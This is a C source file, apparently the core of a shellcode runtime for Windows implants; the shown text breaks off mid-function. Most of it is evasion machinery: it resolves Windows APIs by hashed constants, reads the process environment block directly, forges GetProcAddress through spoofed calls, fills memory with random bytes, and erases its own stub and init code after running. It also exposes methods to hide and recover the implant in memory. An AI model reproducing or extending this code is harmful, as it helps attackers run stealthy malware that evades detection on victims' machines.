#include "build.h"
#include "c_types.h"
#include "win_types.h"
#include "dll_kernel32.h"
#include "lib_memory.h"
#include "lib_string.h"
#include "rel_addr.h"
#include "hash_api.h"
#include "random.h"
#include "crypto.h"
#include "compress.h"
#include "serialize.h"
#include "mem_scanner.h"
#include "win_api.h"
#include "errno.h"
#include "context.h"
#include "layout.h"
#include "mod_library.h"
#include "mod_memory.h"
#include "mod_thread.h"
#include "mod_resource.h"
#include "mod_argument.h"
#include "mod_storage.h"
#include "win_base.h"
#include "win_file.h"
#include "win_http.h"
#include "win_crypto.h"
#include "sysmon.h"
#include "watchdog.h"
#include "shield.h"
#include "runtime.h"
#include "debug.h"

// about Windows API redirector
typedef struct {
    void* src;
    void* dst;
} API_RDR;

typedef struct {
    // store options from argument
    Runtime_Opts Options;

    // process environment
    void* PEB;   // process environment block
    void* IMOML; // In-Memory order module list

    // API addresses
    GetSystemInfo_t          GetSystemInfo;
    LoadLibraryA_t           LoadLibraryA;
    FreeLibrary_t            FreeLibrary;
    GetProcAddress_t         GetProcAddress;
    VirtualAlloc_t           VirtualAlloc;
    VirtualFree_t            VirtualFree;
    VirtualProtect_t         VirtualProtect;
    VirtualQuery_t           VirtualQuery;
    FlushInstructionCache_t  FlushInstructionCache;
    SuspendThread_t          SuspendThread;
    ResumeThread_t           ResumeThread;
    ExitThread_t             ExitThread;
    CreateMutexA_t           CreateMutexA;
    ReleaseMutex_t           ReleaseMutex;
    CreateEventA_t           CreateEventA;
    SetEvent_t               SetEvent;
    CreateWaitableTimerA_t   CreateWaitableTimerA;
    SetWaitableTimer_t       SetWaitableTimer;
    WaitForSingleObject_t    WaitForSingleObject;
    WaitForMultipleObjects_t WaitForMultipleObjects;
    DuplicateHandle_t        DuplicateHandle;
    CloseHandle_t            CloseHandle;
    SetCurrentDirectoryA_t   SetCurrentDirectoryA;
    SetCurrentDirectoryW_t   SetCurrentDirectoryW;
    SleepEx_t                SleepEx;
    ExitProcess_t            ExitProcess;

    // system information
    SYSTEM_INFO SysInfo;

    // runtime data
    void*  MainMemPage; // store all structures
    void*  Epilogue;    // store shellcode epilogue
    uint32 PageSize;    // for memory management
    HANDLE hMutex;      // global method mutex

    // try to lock submodules mutex
    HANDLE ModMutexHandle[6];
    bool   ModMutexStatus[6];

    // Windows API redirector about GetProcAddress
    API_RDR Redirectors[67];

    // runtime submodules
    LibraryTracker_M*  LibraryTracker;
    MemoryTracker_M*   MemoryTracker;
    ThreadTracker_M*   ThreadTracker;
    ResourceTracker_M* ResourceTracker;
    ArgumentStore_M*   ArgumentStore;
    InMemoryStorage_M* InMemoryStorage;

    // high-level modules
    WinBase_M*   WinBase;
    WinFile_M*   WinFile;
    WinHTTP_M*   WinHTTP;
    WinCrypto_M* WinCrypto;

    // reliability modules
    Sysmon_M*   Sysmon;
    Watchdog_M* Watchdog;
} Runtime;

// export methods about Runtime
void* RT_FindAPI(uint module, uint procedure, uint key);
void* RT_FindAPI_ML(void* list, uint module, uint procedure, uint key);
void* RT_FindAPI_A(byte* module, byte* procedure);
void* RT_FindAPI_W(uint16* module, byte* procedure);

void* RT_GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
void* RT_GetProcAddressByName(HMODULE hModule, LPCSTR lpProcName, bool redirect);
void* RT_GetProcAddressByHash(uint mHash, uint pHash, uint hKey, bool redirect);
void* RT_GetProcAddressByHashML(void* list, uint mHash, uint pHash, uint hKey, bool redirect);
void* RT_GetProcAddressOriginal(HMODULE hModule, LPCSTR lpProcName);

void* RT_GetPEB();
void* RT_GetTEB();
void* RT_GetIMOML();

BOOL  RT_SetCurrentDirectoryA(LPSTR lpPathName);
BOOL  RT_SetCurrentDirectoryW(LPWSTR lpPathName);
void  RT_Sleep(DWORD dwMilliseconds);
DWORD RT_SleepEx(DWORD dwMilliseconds, BOOL bAlertable);
void  RT_ExitProcess(UINT uExitCode);

errno RT_SleepHR(DWORD dwMilliseconds);
errno RT_Hide();
errno RT_Recover();
errno RT_GetMetrics(Runtime_Metrics* metrics);
errno RT_Cleanup();
errno RT_Exit();
void  RT_Stop();

// internal methods for Runtime submodules
void* RT_malloc(uint size);
void* RT_calloc(uint num, uint size);
void* RT_realloc(void* ptr, uint size);
bool  RT_free(void* ptr);
uint  RT_msize(void* ptr);
uint  RT_mcap(void* ptr);

errno RT_lock_mods();
errno RT_unlock_mods();
void  RT_try_lock_mods();
void  RT_try_unlock_mods();

void RT_flush_api_cache();

// method wrapper for user and Runtime submodules
uint MW_MemScanByValue(void* value, uint size, uintptr* results, uint maxItem);
uint MW_MemScanByPattern(byte* pattern, uintptr* results, uint maxItem);
bool MW_WD_IsEnabled();

// HashAPI with spoof call (forge GetProcAddress)
void* FindAPI_SC(uint module, uint procedure, uint key);
void* FindAPI_SC_ML(void* list, uint module, uint procedure, uint key);

// hard encoded address in getRuntimePointer for replacement
#ifdef _WIN64
    #define RUNTIME_POINTER 0x7FABCDEF111111FF
#elif _WIN32
    #define RUNTIME_POINTER 0x7FAB11FF
#endif
static Runtime* getRuntimePointer();

static bool rt_lock();
static bool rt_unlock();

static bool  isValidArgumentStub();
static void* getPEBAddress();
static void* getIMOMLAddress(uintptr peb);
static void* allocRuntimeMemPage(void* IMOML);
static void* calculateEpilogue();
static bool  initRuntimeAPI(Runtime* runtime);
static bool  adjustPageProtect(Runtime* runtime, DWORD* old);
static bool  recoverPageProtect(Runtime* runtime, DWORD protect);
static bool  updateRuntimePointer(Runtime* runtime);
static bool  recoverRuntimePointer(Runtime* runtime);
static errno initRuntimeEnvironment(Runtime* runtime);
static errno initSubmodules(Runtime* runtime);
static errno initLibraryTracker(Runtime* runtime, Context* context);
static errno initMemoryTracker(Runtime* runtime, Context* context);
static errno initThreadTracker(Runtime* runtime, Context* context);
static errno initResourceTracker(Runtime* runtime, Context* context);
static errno initArgumentStore(Runtime* runtime, Context* context);
static errno initInMemoryStorage(Runtime* runtime, Context* context);
static errno initWinBase(Runtime* runtime, Context* context);
static errno initWinFile(Runtime* runtime, Context* context);
static errno initWinHTTP(Runtime* runtime, Context* context);
static errno initWinCrypto(Runtime* runtime, Context* context);
static errno initSysmon(Runtime* runtime, Context* context);
static errno initWatchdog(Runtime* runtime, Context* context);
static bool  initAPIRedirector(Runtime* runtime);
static bool  flushInstructionCache(Runtime* runtime);
static void  eraseArgumentStub(Runtime* runtime);
static void  eraseRuntimeMethods(Runtime* runtime);
static errno cleanRuntime(Runtime* runtime);
static errno closeHandles(Runtime* runtime);

static void* getRuntimeMethods(LPCWSTR module, LPCSTR lpProcName);
static void* getAPIRedirector(Runtime* runtime, void* proc);
static void* getLazyAPIRedirector(Runtime* runtime, void* proc);

static errno sleep(Runtime* runtime, HANDLE hTimer);
static errno hide(Runtime* runtime);
static errno recover(Runtime* runtime);
static errno stop(bool exitThread);

static void eraseMemory(uintptr address, uintptr size);
static void rt_epilogue();

Runtime_M* InitRuntime(Runtime_Opts* opts)
{
    if (!InitDebugger())
    {
        SetLastErrno(ERR_RUNTIME_INIT_DEBUGGER);
        return NULL;
    }
    // check argument stub for calculate Epilogue
    if (!isValidArgumentStub())
    {
        SetLastErrno(ERR_RUNTIME_INVALID_ARGS_STUB);
        return NULL;
    }
    // get process environment
    void* PEB   = getPEBAddress();
    void* IMOML = getIMOMLAddress((uintptr)PEB);
    // alloc memory for store runtime structure
    void* memPage = allocRuntimeMemPage(IMOML);
    if (memPage == NULL)
    {
        SetLastErrno(ERR_RUNTIME_ALLOC_MEMORY);
        return NULL;
    }
    // set structure address
    uintptr addr = (uintptr)memPage;
    uintptr runtimeAddr = addr + LAYOUT_RUNTIME_STRUCT + RandUintN(addr, 128);
    uintptr moduleAddr  = addr + LAYOUT_RUNTIME_MODULE + RandUintN(addr, 128);
    // initialize structure
    Runtime* runtime = (Runtime*)runtimeAddr;
    mem_init(runtime, sizeof(Runtime));
    // store runtime options
    if (opts == NULL)
    {
        Runtime_Opts opt = {
            .BootInstAddress     = NULL,
            .DisableSysmon       = false,
            .DisableWatchdog     = false,
            .NotEraseInstruction = false,
            .NotAdjustProtect    = false,
            .TrackCurrentThread  = false,
        };
        opts = &opt;
    }
    runtime->Options = *opts;
    // store process environment
    runtime->PEB   = PEB;
    runtime->IMOML = IMOML;
    // set runtime data
    runtime->MainMemPage = memPage;
    runtime->Epilogue    = calculateEpilogue();
    // initialize runtime
    DWORD oldProtect = 0;
    errno errno = NO_ERROR;
    for (;;)
    {
        if (!initRuntimeAPI(runtime))
        {
            errno = ERR_RUNTIME_INIT_API;
            break;
        }
        if (!adjustPageProtect(runtime, &oldProtect))
        {
            errno = ERR_RUNTIME_ADJUST_PROTECT;
            break;
        }
        if (!updateRuntimePointer(runtime))
        {
            errno = ERR_RUNTIME_UPDATE_PTR;
            break;
        }
        errno = initRuntimeEnvironment(runtime);
        if (errno != NO_ERROR)
        {
            break;
        }
        errno = initSubmodules(runtime);
        if (errno != NO_ERROR)
        {
            break;
        }
        if (!initAPIRedirector(runtime))
        {
            errno = ERR_RUNTIME_INIT_API_REDIRECTOR;
            break;
        }
        break;
    }
    // if failed to initialize runtime, erase argument stub if memory page can write.
    if (errno > ERR_RUNTIME_ADJUST_PROTECT || opts->NotAdjustProtect)
    {
        eraseArgumentStub(runtime);
    }
    if (errno == NO_ERROR || errno > ERR_RUNTIME_ADJUST_PROTECT)
    {
        eraseRuntimeMethods(runtime);
    }
    if (oldProtect != 0)
    {
        if (!recoverPageProtect(runtime, oldProtect) && errno == NO_ERROR)
        {
            errno = ERR_RUNTIME_RECOVER_PROTECT;
        }
    }
    if (errno == NO_ERROR && !flushInstructionCache(runtime))
    {
        errno = ERR_RUNTIME_FLUSH_INST;
    }
    if (errno != NO_ERROR)
    {
        cleanRuntime(runtime);
        SetLastErrno(errno);
        return NULL;
    }
    // create methods for Runtime
    Runtime_M* module = (Runtime_M*)moduleAddr;
    // hash api
    module->HashAPI.FindAPI    = GetFuncAddr(&RT_FindAPI);
    module->HashAPI.FindAPI_ML = GetFuncAddr(&RT_FindAPI_ML);
    module->HashAPI.FindAPI_A  = GetFuncAddr(&RT_FindAPI_A);
    module->HashAPI.FindAPI_W  = GetFuncAddr(&RT_FindAPI_W);
    // library tracker
    module->Library.LoadA   = runtime->LibraryTracker->LoadLibraryA;
    module->Library.LoadW   = runtime->LibraryTracker->LoadLibraryW;
    module->Library.LoadExA = runtime->LibraryTracker->LoadLibraryExA;
    module->Library.LoadExW = runtime->LibraryTracker->LoadLibraryExW;
    module->Library.Free    = runtime->LibraryTracker->FreeLibrary;
    module->Library.GetProc = GetFuncAddr(&RT_GetProcAddress);
    module->Library.Lock    = runtime->LibraryTracker->LockModule;
    module->Library.Unlock  = runtime->LibraryTracker->UnlockModule;
    module->Library.Status  = runtime->LibraryTracker->GetStatus;
    module->Library.FreeAll = runtime->LibraryTracker->FreeAllMu;
    // memory tracker
    module->Memory.Alloc   = runtime->MemoryTracker->Alloc;
    module->Memory.Calloc  = runtime->MemoryTracker->Calloc;
    module->Memory.Realloc = runtime->MemoryTracker->Realloc;
    module->Memory.Free    = runtime->MemoryTracker->Free;
    module->Memory.Size    = runtime->MemoryTracker->Size;
    module->Memory.Cap     = runtime->MemoryTracker->Cap;
    module->Memory.Lock    = runtime->MemoryTracker->LockRegion;
    module->Memory.Unlock  = runtime->MemoryTracker->UnlockRegion;
    module->Memory.Status  = runtime->MemoryTracker->GetStatus;
    module->Memory.FreeAll = runtime->MemoryTracker->FreeAllMu;
    // thread tracker
    module->Thread.New     = runtime->ThreadTracker->New;
    module->Thread.Exit    = runtime->ThreadTracker->Exit;
    module->Thread.Sleep   = runtime->ThreadTracker->Sleep;
    module->Thread.Lock    = runtime->ThreadTracker->LockThread;
    module->Thread.Unlock  = runtime->ThreadTracker->UnlockThread;
    module->Thread.Status  = runtime->ThreadTracker->GetStatus;
    module->Thread.KillAll = runtime->ThreadTracker->KillAllMu;
    // resource tracker
    module->Resource.LockMutex           = runtime->ResourceTracker->LockMutex;
    module->Resource.UnlockMutex         = runtime->ResourceTracker->UnlockMutex;
    module->Resource.LockEvent           = runtime->ResourceTracker->LockEvent;
    module->Resource.UnlockEvent         = runtime->ResourceTracker->UnlockEvent;
    module->Resource.LockSemaphore       = runtime->ResourceTracker->LockSemaphore;
    module->Resource.UnlockSemaphore     = runtime->ResourceTracker->UnlockSemaphore;
    module->Resource.LockWaitableTimer   = runtime->ResourceTracker->LockWaitableTimer;
    module->Resource.UnlockWaitableTimer = runtime->ResourceTracker->UnlockWaitableTimer;
    module->Resource.LockFile            = runtime->ResourceTracker->LockFile;
    module->Resource.UnlockFile          = runtime->ResourceTracker->UnlockFile;
    module->Resource.Status              = runtime->ResourceTracker->GetStatus;
    module->Resource.FreeAll             = runtime->ResourceTracker->FreeAllMu;
    // argument store
    module->Argument.GetValue   = runtime->ArgumentStore->GetValue;
    module->Argument.GetPointer = runtime->ArgumentStore->GetPointer;
    module->Argument.Erase      = runtime->ArgumentStore->Erase;
    module->Argument.EraseAll   = runtime->ArgumentStore->EraseAll;
    // in-memory storage
    module->Storage.SetValue   = runtime->InMemoryStorage->SetValue;
    module->Storage.GetValue   = runtime->InMemoryStorage->GetValue;
    module->Storage.GetPointer = runtime->InMemoryStorage->GetPointer;
    module->Storage.Delete     = runtime->InMemoryStorage->Delete;
    module->Storage.DeleteAll  = runtime->InMemoryStorage->DeleteAll;
    // WinBase
    module->WinBase.ANSIToUTF16  = runtime->WinBase->ANSIToUTF16;
    module->WinBase.UTF16ToANSI  = runtime->WinBase->UTF16ToANSI;
    module->WinBase.ANSIToUTF16N = runtime->WinBase->ANSIToUTF16N;
    module->WinBase.UTF16ToANSIN = runtime->WinBase->UTF16ToANSIN;
    // WinFile
    module->WinFile.ReadFileA  = runtime->WinFile->ReadFileA;
    module->WinFile.ReadFileW  = runtime->WinFile->ReadFileW;
    module->WinFile.WriteFileA = runtime->WinFile->WriteFileA;
    module->WinFile.WriteFileW = runtime->WinFile->WriteFileW;
    // WinHTTP
    module->WinHTTP.Init    = runtime->WinHTTP->Init;
    module->WinHTTP.Get     = runtime->WinHTTP->Get;
    module->WinHTTP.Post    = runtime->WinHTTP->Post;
    module->WinHTTP.Do      = runtime->WinHTTP->Do;
    module->WinHTTP.FreeDLL = runtime->WinHTTP->FreeDLL;
    // WinCrypto
    module->WinCrypto.RandBuffer = runtime->WinCrypto->RandBuffer;
    module->WinCrypto.Hash       = runtime->WinCrypto->Hash;
    module->WinCrypto.HMAC       = runtime->WinCrypto->HMAC;
    module->WinCrypto.AESEncrypt = runtime->WinCrypto->AESEncrypt;
    module->WinCrypto.AESDecrypt = runtime->WinCrypto->AESDecrypt;
    module->WinCrypto.RSAGenKey  = runtime->WinCrypto->RSAGenKey;
    module->WinCrypto.RSAPubKey  = runtime->WinCrypto->RSAPubKey;
    module->WinCrypto.RSASign    = runtime->WinCrypto->RSASign;
    module->WinCrypto.RSAVerify  = runtime->WinCrypto->RSAVerify;
    module->WinCrypto.RSAEncrypt = runtime->WinCrypto->RSAEncrypt;
    module->WinCrypto.RSADecrypt = runtime->WinCrypto->RSADecrypt;
    module->WinCrypto.FreeDLL    = runtime->WinCrypto->FreeDLL;
    // random module
    module->Random.Buffer  = GetFuncAddr(&RandBuffer);
    module->Random.Bool    = GetFuncAddr(&RandBool);
    module->Random.Int64   = GetFuncAddr(&RandInt64);
    module->Random.Uint64  = GetFuncAddr(&RandUint64);
    module->Random.Int64N  = GetFuncAddr(&RandInt64N);
    module->Random.Uint64N = GetFuncAddr(&RandUint64N);
    // crypto module
    module->Crypto.Encrypt = GetFuncAddr(&EncryptBuf);
    module->Crypto.Decrypt = GetFuncAddr(&DecryptBuf);
    // compress module
    module->Compressor.Compress   = GetFuncAddr(&Compress);
    module->Compressor.Decompress = GetFuncAddr(&Decompress);
    // serialization module
    module->Serialization.Serialize   = GetFuncAddr(&Serialize);
    module->Serialization.Unserialize = GetFuncAddr(&Unserialize);
    // memory scanner
    module->MemScanner.ScanByValue   = GetFuncAddr(&MW_MemScanByValue);
    module->MemScanner.ScanByPattern = GetFuncAddr(&MW_MemScanByPattern);
    module->MemScanner.BinToPattern  = GetFuncAddr(&BinToPattern);
    // get procedure address
    module->Procedure.GetProcByName   = GetFuncAddr(&RT_GetProcAddressByName);
    module->Procedure.GetProcByHash   = GetFuncAddr(&RT_GetProcAddressByHash);
    module->Procedure.GetProcByHashML = GetFuncAddr(&RT_GetProcAddressByHashML);
    // about system monitor
    module->Sysmon.Status   = runtime->Sysmon->GetStatus;
    module->Sysmon.Pause    = runtime->Sysmon->Pause;
    module->Sysmon.Continue = runtime->Sysmon->Continue;
    // about watchdog
    module->Watchdog.Kick       = runtime->Watchdog->Kick;
    module->Watchdog.Enable     = runtime->Watchdog->Enable;
    module->Watchdog.Disable    = runtime->Watchdog->Disable;
    module->Watchdog.IsEnabled  = runtime->Watchdog->IsEnabled;
    module->Watchdog.SetHandler = runtime->Watchdog->SetHandler;
    module->Watchdog.Status     = runtime->Watchdog->GetStatus;
    module->Watchdog.Pause      = runtime->Watchdog->Pause;
    module->Watchdog.Continue   = runtime->Watchdog->Continue;
    // about process environment
    module->Env.GetPEB   = GetFuncAddr(&RT_GetPEB);
    module->Env.GetTEB   = GetFuncAddr(&RT_GetTEB);
    module->Env.GetIMOML = GetFuncAddr(&RT_GetIMOML);
    // {THE TRUTH OF THE WORLD} && [THE END OF THE WORLD] :(
    module->Raw.GetProcAddress = GetFuncAddr(&RT_GetProcAddressOriginal);
    module->Raw.ExitProcess    = GetFuncAddr(&RT_ExitProcess);
    // runtime core methods
    module->Core.Sleep   = GetFuncAddr(&RT_SleepHR);
    module->Core.Hide    = GetFuncAddr(&RT_Hide);
    module->Core.Recover = GetFuncAddr(&RT_Recover);
    module->Core.Metrics = GetFuncAddr(&RT_GetMetrics);
    module->Core.Cleanup = GetFuncAddr(&RT_Cleanup);
    module->Core.Exit    = GetFuncAddr(&RT_Exit);
    module->Core.Stop    = GetFuncAddr(&RT_Stop);
    // runtime core data
    module->Data.Mutex = runtime->hMutex;
    return module;
}

static bool isValidArgumentStub()
{
    uintptr stubAddr = (uintptr)(GetFuncAddr(&Argument_Stub));
    // calculate header checksum
    uint32 checksum = 0;
    for (uintptr i = 0; i < ARG_OFFSET_CHECKSUM; i++)
    {
        byte b = *(byte*)(stubAddr + i);
        checksum += checksum << 1;
        checksum += b;
    }
    uint32 expected = *(uint32*)(stubAddr + ARG_OFFSET_CHECKSUM);
    return checksum == expected;
}

static void* getPEBAddress()
{
#ifdef _WIN64
    uintptr teb = __readgsqword(0x30);
    uintptr peb = *(uintptr*)(teb + 0x60);
#elif _WIN32
    uintptr teb = __readfsdword(0x18);
    uintptr peb = *(uintptr*)(teb + 0x30);
#endif
    return (void*)peb;
}

static void* getIMOMLAddress(uintptr peb)
{
#ifdef _WIN64
    uintptr ldr = *(uintptr*)(peb + 0x18);
    uintptr mod = *(uintptr*)(ldr + 0x20);
#elif _WIN32
    uintptr ldr = *(uintptr*)(peb + 0x0C);
    uintptr mod = *(uintptr*)(ldr + 0x14);
#endif
    return (void*)mod;
}

static void* allocRuntimeMemPage(void* IMOML)
{
#ifdef _WIN64
    uint mHash = 0x7CCA6C542E19FE5E;
    uint pHash = 0xAA8D188A1F0862DC;
    uint hKey  = 0x6EDC8B580ACA6913;
#elif _WIN32
    uint mHash = 0x67F47A59;
    uint pHash = 0xA7CFDD6F;
    uint hKey  = 0x0F2BB61F;
#endif
    VirtualAlloc_t virtualAlloc = FindAPI_ML(IMOML, mHash, pHash, hKey);
    if (virtualAlloc == NULL)
    {
        return NULL;
    }
    SIZE_T size = MAIN_MEM_PAGE_SIZE + (1 + RandUintN(0, 32)) * 1024;
    LPVOID addr = virtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (addr == NULL)
    {
        return NULL;
    }
    RandBuffer(addr, (int64)size);
    dbg_log("[runtime]", "Main Memory Page: 0x%zX", addr);
    return addr;
}

static void* calculateEpilogue()
{
    uintptr stub = (uintptr)(GetFuncAddr(&Argument_Stub));
    uint32  size = *(uint32*)(stub + ARG_OFFSET_ARGS_SIZE);
    size += ARG_OFFSET_FIRST_ARG;
    return (void*)(stub + size);
}

static bool initRuntimeAPI(Runtime* runtime)
{
    typedef struct { 
        uint mHash; uint pHash; uint hKey; void* proc;
    } winapi;
    winapi list[] =
#ifdef _WIN64
    {
        { 0x81281D579CF95014, 0x86A86D57C8A841B1, 0x17525CC1E154BA98 }, // GetSystemInfo
        { 0xE57ED03045CF8261, 0xB726BDCEE213B000, 0xBC41C33EE9102207 }, // LoadLibraryA
        { 0x39040AAE82DF6A27, 0x715D0BA3A37704ED, 0xF5E8C64F2FD1E69A }, // FreeLibrary
        { 0x8DEA92825258B43D, 0x1E1187BF74A001D9, 0x2457B30C5AFA694C }, // GetProcAddress
        { 0x01D79EDD3081D078, 0x447B8E23EA19AFBF, 0xC733FDBD9B57119F }, // VirtualAlloc
        { 0x103364F533A102DE, 0x66E51926BF5C2675, 0xE23E338B794BD214 }, // VirtualFree
        { 0xE61F09814F6DB0F1, 0xE720DBF70F19D718, 0xFD32DE1953F12824 }, // VirtualProtect
        { 0x782DBEA37FA26901, 0x6BFCB0DC860C2060, 0xB7AE04F1641B5A9E }, // VirtualQuery
        { 0x2942F56B284BE6A0, 0x06172C4E43D310FB, 0xF2B7646EDF1ADF06 }, // FlushInstructionCache
        { 0x83E845755EFA1E95, 0xFC8825DC3C55B265, 0xCCBCA1685F8E8AD6 }, // SuspendThread
        { 0x392F3A38C3FA3EED, 0xB0CAB85785F06761, 0xF5EE69828D2BD6E1 }, // ResumeThread
        { 0x8C967347E10E2345, 0x9AD093D6D3F3F010, 0xE78BBF9830AA8844 }, // ExitThread
        { 0x4A7A5CA9B2E5DC14, 0x1201412A13AA4E6F, 0x7275A1F15DD85A1F }, // CreateMutexA
        { 0x821C92139935AD25, 0x34B5B1C885933D84, 0xE2276FF8F3AD2105 }, // ReleaseMutex
        { 0xF13C96BD3A704689, 0xEC2E1ED137A9FC13, 0x0AB8729A0AA907A5 }, // CreateEventA
        { 0xE8FFF1BA649033AB, 0xB21BF291AD8FCA39, 0xFE54EB09C78288C7 }, // SetEvent
        { 0x2231484832A86586, 0xE28EEE755182BA08, 0xD80628473A8AC9D2 }, // CreateWaitableTimerA
        { 0xEFD2B93BE1E8CE28, 0x5EA44B4FC8403DDC, 0xEB2D517E67A9A193 }, // SetWaitableTimer
        { 0x350460801951609A, 0x023C544BECCF303A, 0x70BE40CC74D98FA5 }, // WaitForSingleObject
        { 0x1B2F1DFD8CC1DEE2, 0xAA914C97CF93C6C4, 0xEBD4EB0F98F02345 }, // WaitForMultipleObjects
        { 0x903C6C0D3F5EA5B5, 0x8C0157728DBBDF00, 0x72A6D14AD23E4170 }, // DuplicateHandle
        { 0x34F6DB7FD270DACD, 0xAD3CAC3CA6B3F85F, 0x3A69E267838CC49B }, // CloseHandle
        { 0x9645F47C050C8970, 0x7958DD2E625BFB9A, 0x8D88DDA980B5423A }, // SetCurrentDirectoryA
        { 0x2DA99CE4EAA5EBC5, 0x92705193BA8D0E4C, 0x0157A58CBD86F5CB }, // SetCurrentDirectoryW
        { 0x45C00FCCD8608BF4, 0xFF59A6239E10D034, 0x259506B04B900790 }, // SleepEx
        { 0xA42803533C850050, 0xAE626A54FB4B1EFE, 0xC74CD2670540D0E5 }, // ExitProcess
    };
#elif _WIN32
    {
        { 0x48CAA960, 0x1BE725E8, 0x54FE3C56 }, // GetSystemInfo
        { 0x4C088F20, 0x8A1A09AF, 0x639DAAE1 }, // LoadLibraryA
        { 0x4FEEC1A5, 0x9DC3A7B5, 0x4C5DFFD2 }, // FreeLibrary
        { 0xFFD5608B, 0x3E95C861, 0xB86AF953 }, // GetProcAddress
        { 0xED38BE94, 0x2EC158C4, 0xB33593DB }, // VirtualAlloc
        { 0x2E5F98A6, 0xBFAD008B, 0x086D5CBA }, // VirtualFree
        { 0xA0D678CB, 0x684D4B46, 0xFEAE4785 }, // VirtualProtect
        { 0x35881A35, 0x8066F5F0, 0x1587304E }, // VirtualQuery
        { 0x1EF0D6B9, 0xF3E223E4, 0x58D1C6E8 }, // FlushInstructionCache
        { 0xE5E1E669, 0xBFE496D9, 0x144C6CFA }, // SuspendThread
        { 0x87529AFE, 0xA848A36A, 0xF5703D40 }, // ResumeThread
        { 0x075404B1, 0x01C3A55A, 0x543BD02E }, // ExitThread
        { 0xAEF6CD4F, 0x7613A300, 0x2BE798B4 }, // CreateMutexA
        { 0x566023B1, 0x71D96B6C, 0x44DC831F }, // ReleaseMutex
        { 0x914613C6, 0x05E6B16C, 0x56C2B5B2 }, // CreateEventA
        { 0x23C3DD82, 0xB6BDC3FE, 0x5EA25057 }, // SetEvent
        { 0x587233C2, 0xCBE31C79, 0xB527BB80 }, // CreateWaitableTimerA
        { 0x9ABC8C02, 0x174F7821, 0xAF05BDDE }, // SetWaitableTimer
        { 0xDDF3C456, 0x8312BDD3, 0xD3DE42B6 }, // WaitForSingleObject
        { 0x11612FF7, 0xCC00FC68, 0xC0A6D2E7 }, // WaitForMultipleObjects
        { 0xA0D83F42, 0xC75C037E, 0xA87DF314 }, // DuplicateHandle
        { 0x35F0E826, 0xD4D75A32, 0x585D80CF }, // CloseHandle
        { 0xC029EB89, 0x2361ABF9, 0xBD82334D }, // SetCurrentDirectoryA
        { 0xB3FC81E0, 0xD69E0B74, 0x2833ECFE }, // SetCurrentDirectoryW
        { 0xA7424FD3, 0x35D0E695, 0x1FAAF404 }, // SleepEx
        { 0xE715A750, 0xE9D3E889, 0x65A48058 }, // ExitProcess
    };
#endif
    for (int i = 0; i < arrlen(list); i++)
    {
        winapi item = list[i];
        void*  proc = FindAPI_ML(runtime->IMOML, item.mHash, item.pHash, item.hKey);
        if (proc == NULL)
        {
            return false;
        }
        list[i].proc = proc;
    }

    runtime->GetSystemInfo          = list[0x00].proc;
    runtime->LoadLibraryA           = list[0x01].proc;
    runtime->FreeLibrary            = list[0x02].proc;
    runtime->GetProcAddress         = list[0x03].proc;
    runtime->VirtualAlloc           = list[0x04].proc;
    runtime->VirtualFree            = list[0x05].proc;
    runtime->VirtualProtect         = list[0x06].proc;
    runtime->VirtualQuery           = list[0x07].proc;
    runtime->FlushInstructionCache  = list[0x08].proc;
    runtime->SuspendThread          = list[0x09].proc;
    runtime->ResumeThread           = list[0x0A].proc;
    runtime->ExitThread             = list[0x0B].proc;
    runtime->CreateMutexA           = list[0x0C].proc;
    runtime->ReleaseMutex           = list[0x0D].proc;
    runtime->CreateEventA           = list[0x0E].proc;
    runtime->SetEvent               = list[0x0F].proc;
    runtime->CreateWaitableTimerA   = list[0x10].proc;
    runtime->SetWaitableTimer       = list[0x11].proc;
    runtime->WaitForSingleObject    = list[0x12].proc;
    runtime->WaitForMultipleObjects = list[0x13].proc;
    runtime->DuplicateHandle        = list[0x14].proc;
    runtime->CloseHandle            = list[0x15].proc;
    runtime->SetCurrentDirectoryA   = list[0x16].proc;
    runtime->SetCurrentDirectoryW   = list[0x17].proc;
    runtime->SleepEx                = list[0x18].proc;
    runtime->ExitProcess            = list[0x19].proc;
    return true;
}

// CANNOT merge updateRuntimePointer and recoverRuntimePointer
// to one function with two arguments, otherwise the compiler
// will generate the incorrect instructions.

static bool updateRuntimePointer(Runtime* runtime)
{
    bool success = false;
    uintptr target = (uintptr)(GetFuncAddr(&getRuntimePointer));
    for (uintptr i = 0; i < 64; i++)
    {
        uintptr* pointer = (uintptr*)(target);
        if (*pointer != RUNTIME_POINTER)
        {
            target++;
            continue;
        }
        *pointer = (uintptr)runtime;
        success = true;
        break;
    }
    return success;
}

static bool recoverRuntimePointer(Runtime* runtime)
{
    bool success = false;
    uintptr target = (uintptr)(GetFuncAddr(&getRuntimePointer));
    for (uintptr i = 0; i < 64; i++)
    {
        uintptr* pointer = (uintptr*)(target);
        if (*pointer != (uintptr)runtime)
        {
            target++;
            continue;
        }
        *pointer = RUNTIME_POINTER;
        success = true;
        break;
    }
    return success;
}

static errno initRuntimeEnvironment(Runtime* runtime)
{
    // get system information
    runtime->GetSystemInfo(&runtime->SysInfo);
    // store memory page size
    runtime->PageSize = runtime->SysInfo.PageSize;
    // create global mutex
    HANDLE hMutex = runtime->CreateMutexA(NULL, false, NAME_RT_MUTEX_GLOBAL);
    if (hMutex == NULL)
    {
        return ERR_RUNTIME_CREATE_GLOBAL_MUTEX;
    }
    runtime->hMutex = hMutex;
    return NO_ERROR;
}

static errno initSubmodules(Runtime* runtime)
{
    // create context data for initialize other modules
    Context context = {
        .DisableSysmon       = runtime->Options.DisableSysmon,
        .DisableWatchdog     = runtime->Options.DisableWatchdog,
        .NotEraseInstruction = runtime->Options.NotEraseInstruction,
        .TrackCurrentThread  = runtime->Options.TrackCurrentThread,

        .PEB   = runtime->PEB,
        .IMOML = runtime->IMOML,

        .MainMemPage = (uintptr)(runtime->MainMemPage),
        .PageSize    = runtime->PageSize,

        .FindAPI = GetFuncAddr(&FindAPI_SC),

        .malloc  = GetFuncAddr(&RT_malloc),
        .calloc  = GetFuncAddr(&RT_calloc),
        .realloc = GetFuncAddr(&RT_realloc),
        .free    = GetFuncAddr(&RT_free),
        .msize   = GetFuncAddr(&RT_msize),
        .mcap    = GetFuncAddr(&RT_mcap),

        .lock_mods       = GetFuncAddr(&RT_lock_mods),
        .unlock_mods     = GetFuncAddr(&RT_unlock_mods),
        .try_lock_mods   = GetFuncAddr(&RT_try_lock_mods),
        .try_unlock_mods = GetFuncAddr(&RT_try_unlock_mods),

        .LoadLibraryA           = runtime->LoadLibraryA,
        .FreeLibrary            = runtime->FreeLibrary,
        .VirtualAlloc           = runtime->VirtualAlloc,
